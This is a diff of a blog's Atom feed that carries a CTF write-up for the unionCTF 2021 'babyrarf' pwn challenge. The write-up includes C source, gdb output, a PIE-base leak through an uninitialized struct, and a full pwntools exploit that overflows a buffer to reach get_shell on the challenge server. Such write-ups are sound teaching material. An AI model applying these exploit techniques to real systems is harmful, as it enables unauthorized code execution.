@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?> 
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
-    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[unionCTF 2021 on repr]]></title>
+    <generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html"><![CDATA[unionCTF 2021 on repr]]></title>
     
         <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
     
@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/unionCTF-2021/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/unionCTF-2021/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-07-29T20:34:46+02:00</updated>
+    <updated>2022-08-01T03:33:42+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -58,14 +58,14 @@
 >.
 It was a really easy challenge with a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).</p>
 <p>Let&rsquo;s take a look at the src!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span><span class="cp"></span>
 <span class="k">typedef</span> <span class="k">struct</span> <span class="n">attack</span> <span class="p">{</span>
-    <span class="kt">uint64_t</span> <span class="n">id</span><span class="p">;</span>
-    <span class="kt">uint64_t</span> <span class="n">dmg</span><span class="p">;</span>
+    <span class="n">uint64_t</span> <span class="n">id</span><span class="p">;</span>
+    <span class="n">uint64_t</span> <span class="n">dmg</span><span class="p">;</span>
 <span class="p">}</span> <span class="n">attack</span><span class="p">;</span>
 
 <span class="k">typedef</span> <span class="k">struct</span> <span class="n">character</span> <span class="p">{</span>
@@ -73,7 +73,7 @@ It was a really easy challenge with a stack based buffer overflow. The source co
     <span class="kt">int</span> <span class="n">health</span><span class="p">;</span>
 <span class="p">}</span> <span class="n">character</span><span class="p">;</span>
 
-<span class="kt">uint8_t</span> <span class="n">score</span><span class="p">;</span>
+<span class="n">uint8_t</span> <span class="n">score</span><span class="p">;</span>
 
 <span class="kt">int</span> <span class="nf">read_int</span><span class="p">(){</span>
     <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
@@ -166,7 +166,7 @@ It was a really easy challenge with a stack based buffer overflow. The source co
 
 </code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
 <p>Let&rsquo;s take a look at gdb:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  &lt;__libc_start_main+243&gt; mov edi, eax	 ← <span class="nv">$rsp</span>
 0x00007fffffffdf50│+0x0008: 0x00007ffff7ffc620  →  0x0005081200000000
 0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  <span class="s2">&#34;/home/nasm/dist/babyrarf&#34;</span>
@@ -192,7 +192,7 @@ It was a really easy challenge with a stack based buffer overflow. The source co
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  
 </code></pre></div><p>And at the call to fgets:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">   0x55555555537d &lt;main+153&gt;       lea    rax, <span class="o">[</span>rbp-0x20<span class="o">]</span>
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">   0x55555555537d &lt;main+153&gt;       lea    rax, <span class="o">[</span>rbp-0x20<span class="o">]</span>
    0x555555555381 &lt;main+157&gt;       mov    esi, 0xa
    0x555555555386 &lt;main+162&gt;       mov    rdi, rax
  → 0x555555555389 &lt;main+165&gt;       call   0x555555555060 &lt;fgets@plt&gt;
@@ -218,7 +218,7 @@ gef➤
 So we have basically a padding of 40 bytes before the return address, and according to the last fgets, we can only enter 48 bytes.
 We can so overwrite only the return address.</p>
 <p>Now we can take a look at the permissions:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">gef➤  checksec
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">gef➤  checksec
 <span class="o">[</span>+<span class="o">]</span> checksec <span class="k">for</span> <span class="s1">&#39;/home/nasm/dist/babyrarf&#39;</span>
 Canary                        : ✘ 
 NX                            : ✓ 
@@ -227,7 +227,7 @@ Fortify                       : ✘
 RelRO                         : Partial
 </code></pre></div><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
 To do so we can mind the code of <code>choose_attack</code> function:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
     <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
     <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
     <span class="cm">/* Some print stuff */</span>
@@ -254,7 +254,7 @@ To do so we can mind the code of <code>choose_attack</code> function:</p>
 
 </code></pre></div><p>The interesting part is that when our score is zero and that we choose the fourth weapon, the id et dmg fields are not initialized.
 And so it&rsquo;s returning a non initialized struct that it will print just next in the main function:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">
     <span class="cm">/* ... */</span>
     <span class="n">a</span> <span class="o">=</span> <span class="n">choose_attack</span><span class="p">();</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You choose attack %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">id</span><span class="p">);</span>
@@ -264,7 +264,7 @@ And so it&rsquo;s returning a non initialized struct that it will print just nex
 </code></pre></div><p>Uninitialized structures are very useful to obtain leaks because their content is depending of the ancient stackframes which have stored local variables and especially useful pointers.
 And when we try to leak these datas, we can see that a.id displays the address of <code>__lib_csu_init</code>.
 So we just need to leak the address of <code>__lib_csu_init</code> to compute the base address of the binary and so the address of <code>get_shell</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="c1">#p = process(&#34;babyrarf&#34;)</span>
@@ -272,24 +272,24 @@ So we just need to leak the address of <code>__lib_csu_init</code> to compute th
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.204.144.114&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;babyrarf&#39;</span><span class="p">)</span>
 
-<span class="n">set_</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">set_</span> <span class="o">=</span> <span class="bp">False</span>
 <span class="n">base</span> <span class="o">=</span> <span class="mi">0</span>
 <span class="n">csu_leak</span> <span class="o">=</span> <span class="mi">0</span>
 
 <span class="k">def</span> <span class="nf">padd</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
     <span class="k">return</span> <span class="n">d</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;What is your name?</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;What is your name?</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;nasm&#34;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;4. A cr0wn</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;4. A cr0wn</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
 
-<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="n">a</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;4. A cr0wn</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 
     <span class="k">if</span> <span class="ow">not</span> <span class="n">a</span><span class="p">:</span>
         <span class="k">break</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
     
     <span class="k">if</span> <span class="ow">not</span> <span class="n">set_</span><span class="p">:</span>
         <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
@@ -300,14 +300,14 @@ So we just need to leak the address of <code>__lib_csu_init</code> to compute th
 
     <span class="k">if</span> <span class="s2">&#34;l0zers don&#39;t get cr0wns&#34;</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
         <span class="n">leak_csu</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)))</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;leak_csu=</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_csu</span><span class="p">))))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;leak_csu={}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_csu</span><span class="p">))))</span>
         <span class="n">base</span> <span class="o">=</span> <span class="n">leak_csu</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_csu_init&#39;</span><span class="p">]</span>
 
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;base: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;base: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)))</span>
 
-        <span class="n">set_</span> <span class="o">=</span> <span class="kc">True</span>
+        <span class="n">set_</span> <span class="o">=</span> <span class="bp">True</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Congratulations! You may now declare yourself the winner:</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Congratulations! You may now declare yourself the winner:</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
 
 <span class="c1">#gdb.attach(p.pid)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;get_shell&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">base</span><span class="p">))</span>
@@ -316,7 +316,7 @@ So we just need to leak the address of <code>__lib_csu_init</code> to compute th
 </code></pre></div><p>We can compute compute the value of rand to avoid bruteforce, but I&rsquo;ve choosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
 When It&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
 And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">/* ... */
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">/* ... */
 /* lot of iterations */
 /* ... */
 
